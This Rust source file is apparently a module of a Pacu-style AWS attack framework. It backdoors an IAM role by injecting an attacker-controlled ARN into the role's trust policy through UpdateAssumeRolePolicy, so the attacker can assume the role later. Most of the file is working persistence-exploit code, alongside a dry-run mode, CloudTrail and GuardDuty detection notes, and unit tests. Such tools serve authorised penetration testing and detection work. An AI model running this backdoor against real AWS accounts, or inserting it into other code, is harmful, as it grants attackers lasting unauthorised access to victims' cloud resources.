//! iam__backdoor_assume_role — modify a role's trust policy to add an attacker principal.
//!
//! Category: PERSIST. Services: ["IAM", "STS"]. Requires --armed for write operations.
//!
//! Concept: An attacker with iam:GetRole + iam:UpdateAssumeRolePolicy can inject
//! an arbitrary principal into an existing role's trust policy, allowing them to
//! assume that role from their own account / user at any future time.
//!
//! Args:
//!   --role-name <name>       target role (required)
//!   --attacker-arn <arn>     principal to add to the trust policy (required for exploit)
//!   --exploit                actually modify the trust policy (requires --armed)
//!
//! Dry-run: fetch and display the current trust policy, then print what would change.
//!
//! Detection: UpdateAssumeRolePolicy — CloudTrail shows trust policy modification;
//! GuardDuty Persistence:IAMUser/AnomalousBehavior

use anyhow::Context as _;
use colored::Colorize;

use crate::module::{AwsContext, Module, ModuleInfo};

// ---------------------------------------------------------------------------
// Module entry point
// ---------------------------------------------------------------------------

pub async fn run(ctx: &AwsContext, args: &[&str]) -> anyhow::Result<()> {
    // ── Parse args ─────────────────────────────────────────────────────────
    let role_name: &str = {
        let pos = args.iter().position(|&a| a == "--role-name");
        match pos.and_then(|i| args.get(i + 1).copied()) {
            Some(r) => r,
            None => anyhow::bail!("--role-name <name> is required"),
        }
    };

    let attacker_arn: Option<&str> = {
        let pos = args.iter().position(|&a| a == "--attacker-arn");
        pos.and_then(|i| args.get(i + 1).copied())
    };

    let exploit = args.contains(&"--exploit");

    if exploit && !ctx.armed {
        eprintln!(
            "{}",
            "Error: --exploit requires --armed. Pass --armed when starting pacu.".red().bold()
        );
        return Ok(());
    }

    if exploit && attacker_arn.is_none() {
        anyhow::bail!("--attacker-arn <arn> is required when using --exploit");
    }

    println!("{}", "iam__backdoor_assume_role".cyan().bold());
    println!(
        "  Detection: UpdateAssumeRolePolicy — CloudTrail shows trust policy modification; \
         GuardDuty Persistence:IAMUser/AnomalousBehavior\n"
    );

    let iam = aws_sdk_iam::Client::new(&ctx.sdk_config);

    // ── Fetch current trust policy ─────────────────────────────────────────
    let resp = iam
        .get_role()
        .role_name(role_name)
        .send()
        .await
        .context("iam:GetRole failed")?;

    let role = resp.role().context("GetRole response missing Role")?;
    let role_arn = role.arn();
    let raw_policy = role
        .assume_role_policy_document()
        .unwrap_or("{}");

    // URL-decode the policy document (AWS returns it percent-encoded)
    let current_policy = urlencoding::decode(raw_policy)
        .map(|s| s.into_owned())
        .unwrap_or_else(|_| raw_policy.to_owned());

    println!("  Role ARN:  {}", role_arn.cyan());
    println!("  Current trust policy document:");
    println!("  {}", "─".repeat(60));
    for line in current_policy.lines() {
        println!("  {line}");
    }
    println!("  {}", "─".repeat(60));

    // ── Dry-run mode ───────────────────────────────────────────────────────
    if !exploit {
        let arn_display = attacker_arn.unwrap_or("<not specified>");
        println!(
            "\n  {} Would modify trust policy to add {} as trusted principal",
            "[DRY-RUN]".cyan(),
            arn_display.yellow()
        );
        println!(
            "\n{}",
            "Run with --exploit --armed --attacker-arn <arn> to actually modify the trust policy."
                .yellow()
        );
        return Ok(());
    }

    // ── Armed + exploit ───────────────────────────────────────────────────
    let attacker = attacker_arn.expect("validated above");

    println!(
        "\n  {} Modifying trust policy of role '{}' to add '{}'...",
        "[EXEC]".red().bold(),
        role_name.yellow(),
        attacker.yellow()
    );

    // Parse the existing policy and inject the attacker ARN
    let modified_policy = inject_principal(&current_policy, attacker)
        .context("Failed to modify trust policy JSON")?;

    iam.update_assume_role_policy()
        .role_name(role_name)
        .policy_document(&modified_policy)
        .send()
        .await
        .context("iam:UpdateAssumeRolePolicy failed")?;

    println!(
        "  {} Trust policy updated.",
        "[OK]".green().bold()
    );
    println!(
        "  Test with: aws sts assume-role --role-arn {} --role-session-name backdoor",
        role_arn.green()
    );
    println!(
        "\n  GuardDuty Detection: Persistence:IAMUser/AnomalousBehavior"
    );

    Ok(())
}

// ---------------------------------------------------------------------------
// Helper: inject an attacker ARN into the trust policy's Principal.AWS field
// ---------------------------------------------------------------------------

fn inject_principal(policy_json: &str, attacker_arn: &str) -> anyhow::Result<String> {
    // Use serde_json for manipulation
    let mut doc: serde_json::Value = serde_json::from_str(policy_json)
        .context("Trust policy is not valid JSON")?;

    // Navigate to Statement array
    let statements = doc
        .get_mut("Statement")
        .and_then(|s| s.as_array_mut())
        .context("Trust policy has no 'Statement' array")?;

    // Find index of first Allow statement, fallback to 0
    let target_idx = {
        let allow_idx = statements.iter().position(|s| {
            s.get("Effect")
                .and_then(|e| e.as_str())
                .map(|e| e == "Allow")
                .unwrap_or(false)
        });
        allow_idx.unwrap_or(0)
    };

    if statements.is_empty() {
        anyhow::bail!("No statements found in trust policy");
    }

    let target = &mut statements[target_idx];

    // Inject into Principal.AWS
    let principal = target
        .get_mut("Principal")
        .context("Statement has no 'Principal' field")?;

    match principal {
        serde_json::Value::Object(ref mut map) => {
            // Principal is a map like {"AWS": "arn:..." or ["arn:...", ...]}
            let aws_entry = map
                .entry("AWS")
                .or_insert(serde_json::Value::Array(vec![]));
            match aws_entry {
                serde_json::Value::Array(ref mut arr) => {
                    let arn_val = serde_json::Value::String(attacker_arn.to_owned());
                    if !arr.contains(&arn_val) {
                        arr.push(arn_val);
                    }
                }
                serde_json::Value::String(ref existing) => {
                    if existing != attacker_arn {
                        let old = existing.clone();
                        *aws_entry = serde_json::Value::Array(vec![
                            serde_json::Value::String(old),
                            serde_json::Value::String(attacker_arn.to_owned()),
                        ]);
                    }
                }
                _ => {
                    *aws_entry = serde_json::Value::String(attacker_arn.to_owned());
                }
            }
        }
        serde_json::Value::String(ref s) => {
            // Principal is "*" — keep it as-is (already permissive)
            let _ = s;
        }
        _ => {
            // Replace the whole Principal with a map containing the attacker ARN
            *principal = serde_json::json!({
                "AWS": [attacker_arn]
            });
        }
    }

    serde_json::to_string_pretty(&doc).context("Failed to serialise modified trust policy")
}

// ---------------------------------------------------------------------------
// Module registration
// ---------------------------------------------------------------------------

inventory::submit! {
    Module {
        info: ModuleInfo {
            name: "iam__backdoor_assume_role",
            author: "lancer-pacu",
            category: "PERSIST",
            one_liner: "Modify a role trust policy to allow an attacker-controlled principal to assume it. Requires --armed + --exploit.",
            services: &["IAM", "STS"],
        },
        run: |ctx, args| Box::pin(run(ctx, args)),
    }
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------
#[cfg(test)]
mod tests {
    use crate::module::Module;

    #[test]
    fn module_registered_in_inventory() {
        let found = inventory::iter::<Module>
            .into_iter()
            .any(|m| m.info.name == "iam__backdoor_assume_role");
        assert!(found, "iam__backdoor_assume_role not found in inventory");
    }

    #[test]
    fn module_category_is_persist() {
        let m = inventory::iter::<Module>
            .into_iter()
            .find(|m| m.info.name == "iam__backdoor_assume_role")
            .expect("iam__backdoor_assume_role not found");
        assert_eq!(m.info.category, "PERSIST");
    }

    #[tokio::test]
    async fn missing_role_name_returns_error() {
        let sdk_config = aws_config::defaults(aws_config::BehaviorVersion::latest())
            .no_credentials()
            .load()
            .await;
        let ctx = crate::module::AwsContext {
            dry_run: true,
            armed: false,
            sdk_config,
            db_pool: None,
        };
        let result = super::run(&ctx, &[]).await;
        assert!(result.is_err(), "expected error when --role-name is missing");
        let msg = result.unwrap_err().to_string();
        assert!(
            msg.contains("--role-name"),
            "error should mention --role-name: {msg}"
        );
    }

    #[tokio::test]
    async fn missing_attacker_arn_in_exploit_mode_returns_error() {
        let sdk_config = aws_config::defaults(aws_config::BehaviorVersion::latest())
            .no_credentials()
            .load()
            .await;
        let ctx = crate::module::AwsContext {
            dry_run: false,
            armed: true,
            sdk_config,
            db_pool: None,
        };
        // --exploit but no --attacker-arn
        let result = super::run(&ctx, &["--role-name", "my-role", "--exploit"]).await;
        assert!(result.is_err(), "expected error when --attacker-arn is missing in exploit mode");
        let msg = result.unwrap_err().to_string();
        assert!(
            msg.contains("--attacker-arn"),
            "error should mention --attacker-arn: {msg}"
        );
    }

    #[test]
    fn inject_principal_adds_arn_to_aws_array() {
        let policy = r#"{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Principal": {"AWS": "arn:aws:iam::111111111111:root"},
    "Action": "sts:AssumeRole"
  }]
}"#;
        let result = super::inject_principal(policy, "arn:aws:iam::999999999999:root");
        assert!(result.is_ok(), "inject_principal should succeed");
        let modified = result.unwrap();
        assert!(
            modified.contains("999999999999"),
            "modified policy should contain the attacker ARN"
        );
        assert!(
            modified.contains("111111111111"),
            "original ARN should still be present"
        );
    }

    #[test]
    fn inject_principal_handles_existing_array() {
        let policy = r#"{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Principal": {"AWS": ["arn:aws:iam::111111111111:root"]},
    "Action": "sts:AssumeRole"
  }]
}"#;
        let result = super::inject_principal(policy, "arn:aws:iam::999999999999:root");
        assert!(result.is_ok());
        let modified = result.unwrap();
        assert!(modified.contains("999999999999"));
        assert!(modified.contains("111111111111"));
    }
}
